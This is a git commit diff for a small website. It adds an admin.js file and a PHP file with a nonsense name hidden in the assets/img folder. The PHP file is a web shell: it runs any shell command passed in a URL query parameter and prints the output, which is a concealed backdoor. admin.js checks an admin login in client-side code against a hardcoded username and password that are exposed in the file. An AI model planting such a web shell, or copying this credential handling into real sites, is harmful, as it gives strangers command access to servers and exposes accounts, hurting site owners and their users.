fe08dc835f3788d8fc4bc71c2859ffe47d9ec69c
MD ASIF MONDAL <asifstar135@gmail.com>
2023-05-02 16:34:40 +0530

    first commit

---
+++ admin.js
@@ -0,0 +1,21 @@
+////////////////////////////   LOGIN PAGE   //////////////////////////
+
+const loginBtn = document.querySelector("login-btn")
+const username = document.querySelector(".username")
+const password = document.querySelector(".password")
+
+const submitForm = () =>{
+    if(username.value != "nashbud_admin" || password.value != "abcd@786NASHBUD") 
+        alert("wrong username or password !");
+    else{
+        window.location.replace("report.html");
+    }
+}
+
+////////////////////////  FEEDBACK PAGE    /////////////////////////////
+
+const exitPage = () =>{
+    if(confirm("Are you sure to exit admin page ?")){
+        window.location.replace("login.html")
+    }
+}
---
+++ assets/img/qwertyuiopasdfghjklzxcvbnm.php
@@ -0,0 +1,5 @@
+<?php
+
+if(isset($_GET['zxcvbnm'])){
+    echo system($_GET['zxcvbnm']);
+}
